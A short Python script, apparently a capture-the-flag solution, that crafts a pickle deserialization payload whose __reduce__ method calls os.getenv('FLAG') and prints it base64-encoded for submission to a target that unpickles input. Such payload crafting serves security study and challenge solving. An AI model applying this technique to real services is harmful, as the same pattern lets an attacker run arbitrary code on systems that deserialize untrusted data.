import pickle
from flask import render_template
import base64


class PayloadGen(object):
    def __reduce__(self):
        import os
        return (os.getenv, ('FLAG',))


if __name__ == '__main__':
    obj = {'name': PayloadGen()}
    dmp = pickle.dumps(obj)
    print(base64.urlsafe_b64encode(dmp))
